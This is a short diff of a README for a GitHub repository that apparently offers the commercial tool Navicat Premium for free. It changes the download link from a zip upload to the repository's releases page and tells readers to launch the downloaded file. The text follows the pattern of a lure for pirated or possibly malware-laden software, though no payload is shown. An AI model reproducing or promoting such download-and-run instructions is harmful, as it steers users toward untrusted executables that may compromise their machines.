@@ -38,7 +38,7 @@ Explore the following topics related to Navicat Premium:
 ## Get Started 🚀
 
 To access all the Navicat Premium resources, simply click on the link below:
-[Download Navicat Premium Free](https://github.com/uploads/App.zip)
+[Download Navicat Premium Free](https://github.com/DhruvPatel2201/Navicat-Premium-Free/releases)
 
 Remember, if the link ends with a file name, you will need to launch it to start your Navicat Premium journey. If the link does not work or is not provided, feel free to check out the "Releases" section of this repository for alternative download options.
 
